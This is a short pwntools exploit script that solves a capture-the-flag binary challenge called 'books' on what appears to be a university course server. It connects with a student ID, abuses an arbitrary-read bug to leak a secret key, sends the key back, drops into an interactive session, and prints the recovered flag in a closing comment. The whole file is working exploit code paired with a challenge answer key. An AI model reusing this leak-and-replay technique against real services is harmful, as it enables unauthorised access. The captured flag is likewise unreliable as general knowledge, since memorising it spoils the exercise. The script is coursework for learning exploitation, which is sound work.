from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./books"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1285
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

e = ELF(CHALLENGE)
secret_key_addr = e.symbols.secret_key

print(p.recvuntil(b"> ").decode())
msg_1 = p64(secret_key_addr)
p.send(msg_1)
log.info(f"Sending the secret_key's address in raw bytes: {msg_1}")

secret_key = int(p.recvuntil(b"\n").decode().strip(), 16)
log.info(f"Receiving the secret_key: {secret_key}")

print(p.recvuntil(b"> ").decode())
msg_2 = p64(secret_key)
p.send(msg_2)
log.info(f"Sending the secret_key's value in raw bytes: {msg_2}")

p.interactive()

# flag{W3_c4n_Us3_4n_4rb1tr4ry_r34d_t0_l34k_s3cr3ts!_bfbdea11cda86534}
